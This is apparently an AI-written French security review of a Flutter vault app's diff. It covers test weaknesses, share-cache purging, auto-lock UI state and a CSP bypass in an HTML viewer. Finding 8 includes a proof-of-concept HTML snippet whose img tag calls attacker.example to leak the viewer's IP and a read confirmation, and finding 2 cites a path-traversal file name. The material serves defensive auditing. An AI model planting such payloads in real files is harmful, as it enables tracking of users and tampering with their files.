## 1) Tests : peuvent-ils rester verts alors que la propriété est fausse ?

### A) `test/vault_service_test.dart`

#### Constat 1 — le test “AAD = header complet” ne prouve pas l’AAD-binding du header  
**Sévérité : MOYEN — CONFIRMÉ**  
**Référence :** `test/vault_service_test.dart:375-401`

**Pourquoi le test peut rester vert alors que la propriété est fausse :**  
Le test flippe `blob[12]` (champ `argon2_mem`), puis attend un échec de `restoreFromBackup`. Or `argon2_mem` est **utilisé pour dériver la clé** (Argon2id) dans `restoreFromBackup`. Donc même si, par régression, vous supprimiez l’AAD “header complet” et reveniez à une AAD constante, ce tampering ferait quand même échouer le déchiffrement (clé dérivée différente ⇒ tag GCM invalide).  

**Scénario concret :** un dev retire l’AAD header-complet dans `VaultService.restoreFromBackup` mais continue de lire `memKB/iter` depuis le header : ce test reste vert, alors que le header pourrait être modifié sur des champs **non utilisés** (ex. `reserved`) sans être détecté.

---

#### Constat 2 — le test “restore ignore une entrée traversée” ne teste pas `restoreFromBackup`  
**Sévérité : FAIBLE — CONFIRMÉ**  
**Référence :** `test/vault_service_test.dart:597-611`

**Pourquoi le test peut rester vert alors que la propriété est fausse :**  
Le test n’appelle jamais `restoreFromBackup` avec une archive forgée contenant un nom `../...`. Il se contente de vérifier que les fichiers *déjà présents dans le coffre* ne contiennent pas `..` (ce qui n’exerce pas le parseur `_parseBackupPayload` sur une entrée malveillante).

**Scénario concret :** une régression dans `_parseBackupPayload` réautorise des noms comme `../../Download/secret.txt` (ou un bypass équivalent) ; ce test resterait vert car il ne restaure rien.

---

#### Constat 3 — risque de non-compilation si `Uint8List` n’est pas ré-exporté par une dépendance  
**Sévérité : MOYEN — HYPOTHÈSE**  
**Référence :** `test/vault_service_test.dart:1-8` (imports) + usages multiples ex. `:241`, `:221`

Le fichier utilise `Uint8List` sans importer `dart:typed_data`. Ça compile **uniquement si** `package:pointycastle/export.dart` (ou autre import) ré-exporte `Uint8List`. Je ne peux pas le prouver depuis le diff seul, donc hypothèse — mais si ce n’est pas ré-exporté, la suite de tests tombe avant même d’exercer le coffre.

**Scénario concret :** CI exécute `flutter test` sur un SDK/pub où `pointycastle/export.dart` ne ré-exporte pas `dart:typed_data` ⇒ compilation KO ⇒ aucun test “vault” ne tourne.

---

### B) `test/batch_ops_service_test.dart`  
**Rien à signaler sur la solidité des assertions principales.**  
Les tests lisent réellement le contenu des fichiers et détectent bien l’écrasement silencieux + le cas “move dans son propre dossier”.

---

## 2) Correctifs : complets ou “jumeau oublié” ?

### Constat 4 — le correctif “share_plus cache” peut casser des partages **hors coffre** (si l’app en fait)  
**Sévérité : ÉLEVÉ — HYPOTHÈSE**  
**Références :**
- purge globale au lifecycle : `lib/main.dart:226-244` (appel `purgeTempDecrypted()` en `paused/hidden/inactive`)
- suppression du dossier `share_plus/` : `lib/services/vault_service.dart:476-515`

Vous avez étendu `purgeTempDecrypted` à `cache/share_plus/`. Or `main.dart` purge **à chaque** passage en arrière-plan, sans garde autre que `_sharesInFlight` (qui n’est incrémenté que via `VaultService.withShare`, donc “partages issus du coffre”).

**Scénario concret :** si l’explorateur (ou un viewer) propose “Partager” un fichier normal via `share_plus` sans l’encadrer par `VaultService.withShare`, alors l’ouverture de la share-sheet fait passer l’app en `inactive/paused` ⇒ `main.dart` appelle `purgeTempDecrypted()` ⇒ suppression de `cache/share_plus/` pendant que l’app cible tente de lire l’URI ⇒ partage qui échoue (pièce jointe vide / erreur côté app cible).  
Je ne peux pas confirmer l’existence d’un partage hors coffre dans les fichiers fournis, donc hypothèse — mais l’architecture (explorateur + share_plus importé ailleurs) rend le jumeau très probable.

---

## 3) Régressions fonctionnelles introduites ?

### Constat 5 — `withShare()` purge probablement **trop tôt** (selon la sémantique de retour de `share_plus`)  
**Sévérité : ÉLEVÉ — HYPOTHÈSE**  
**Références :**
- purge en `finally` : `lib/services/vault_service.dart:374-399`
- usage pour partager du plaintext : `lib/screens/vault/vault_screen.dart:617-626`
- usage pour partager `.rftvault` : `lib/screens/vault/vault_screen.dart:816-825`

`withShare` purge (`purgeTempDecrypted(force: true)`) dès que `Share.shareXFiles(...)` “revient”. Si, côté Android, l’appel Flutter revient **dès le lancement** de l’Intent (avant que l’app cible ait lu le flux), alors vous supprimez :
- le fichier déchiffré (`cache/vault_decrypt/...`)
- et/ou la copie `share_plus` (`cache/share_plus/...`)
pendant que l’URI content:// est encore en cours d’utilisation.

**Scénario concret :** utilisateur partage un PDF du coffre vers Gmail ; la share-sheet s’ouvre, mais `Share.shareXFiles` complète vite ⇒ `withShare` purge ⇒ Gmail ne peut plus lire l’URI ⇒ pièce jointe absente/0 octet.  
Je ne peux pas prouver la sémantique exacte de complétion `share_plus` depuis ce diff, donc hypothèse — mais c’est un point de régression à très haut risque (vous vous battez précisément contre le fait établi “la copie share_plus survit jusqu’au partage suivant”).

---

### Constat 6 — auto-lock inactivité : `VaultScreen` peut rester affiché “déverrouillé” après un lock global  
**Sévérité : MOYEN — CONFIRMÉ**  
**Références :**
- lock sur inactivité (déclenche `VaultService.lock()`) : `lib/main.dart:289-312`
- `VaultScreen` drive l’UI via `_unlocked` local, pas via un listener : `lib/screens/vault/vault_screen.dart:61-114` (état `_unlocked`, mises à jour uniquement dans callbacks UI/lifecycle de l’écran)

Le nouvel idle-lock est global (`main.dart`) et peut verrouiller le coffre alors que l’utilisateur est sur `VaultScreen`. Or `VaultScreen` n’écoute pas `VaultService.unlockedNotifier` et n’a pas de mécanisme pour remettre `_unlocked` à `false` quand le lock vient d’ailleurs que :
- le bouton “Verrouiller”
- le lifecycle observer *de VaultScreen* (pause/detached)
- le reset

**Scénario concret :** utilisateur déverrouille le coffre, pose le téléphone sur une table sur l’écran listant les fichiers du coffre ; au bout de 3 minutes, le coffre est verrouillé (clé zéroïsée), mais l’écran peut rester sur la liste des noms de fichiers (potentiellement sensibles) jusqu’à interaction / rebuild. L’attaquant qui ramasse le téléphone lit les noms sans mot de passe (contenu toujours protégé, mais méta-données divulguées).

---

## 4) Concurrence / cycles de vie

### Constat 7 — `_sharesInFlight` statique : OK sur l’unique isolate UI, mais pas une barrière de cycle de vie  
**Sévérité : FAIBLE — CONFIRMÉ**  
**Référence :** `lib/services/vault_service.dart:362-399` + `:476-489`

Le compteur évite bien le cas “purge defensive pendant share” **si** on est dans `withShare` et **si** la purge est appelée avec `force:false`. Mais :
- `lock()` appelle `purgeTempDecrypted(force:true)` (`lib/services/vault_service.dart:355-361`) ⇒ purge malgré partage (voulu)
- `withShare` purge en fin de callback, sans liaison garantie avec “l’app cible a fini de lire”

**Scénario concret :** utilisateur reste >30s sur la share-sheet ⇒ auto-lock (timer global) ⇒ `lock()` ⇒ purge forcée ⇒ l’app cible lit une URI morte. C’est cohérent avec votre commentaire (“lock prime”), mais c’est un comportement à valider UX.

---

# Points explicitement sains (sur ce diff)

- **Correctif M1 “homonymes + move”** : la propagation “batch + unitaires” est bien faite (`lib/screens/explorer/services/batch_ops_service.dart:44-78` et `lib/screens/explorer/file_explorer_screen.dart:579-632`). Rien à signaler de plus sur le jumeau immédiat.
- **Reset lockout monotone + backup** : correction complète et cohérente (`lib/services/vault_service.dart:1063-1101`). Rien à signaler.
- **Blocklist Kotlin des sous-dossiers cache plaintext** : la boucle sur `PLAINTEXT_CACHE_DIRS` réduit le risque de divergence (mieux que 2 variables séparées) (`android/.../MainActivity.kt:~58-90`). Rien à signaler côté logique.

---

# Le point le plus préoccupant à corriger en priorité

Si vous ne deviez regarder qu’une chose : **la CSP HTML est contournable**.

### Constat 8 — contournement CSP via faux `<head>` dans un commentaire/texte  
**Sévérité : ÉLEVÉ — CONFIRMÉ**  
**Référence :** `lib/screens/viewers/html_viewer_screen.dart:~150-186` (logique `headOpen` / `indexOf('>')` / `replaceRange`)

**Pourquoi c’est exploitable :** vous cherchez le premier `"<head"` en texte brut, sans vous assurer que c’est un vrai tag HTML (et non un commentaire / une chaîne).  

**Scénario concret :** un attaquant fournit un fichier `piège.html` contenant en tête :
```html
<!-- <head> -->
<head>
  <img src="https://attacker.example/pixel?open=1">
</head>
```
Votre insertion CSP repère le `<head>` **dans le commentaire** et insère la balise CSP *dans le commentaire* ⇒ CSP non appliquée ⇒ l’image distante se charge ⇒ fuite IP + horodatage + confirmation de lecture (exactement le problème que vous corrigez).

---

Si tu me donnes aussi le fichier entier `html_viewer_screen.dart` (pas seulement le diff), je peux recaler des `fichier:ligne` exacts (sans “~”) pour les constats HTML et VaultScreen.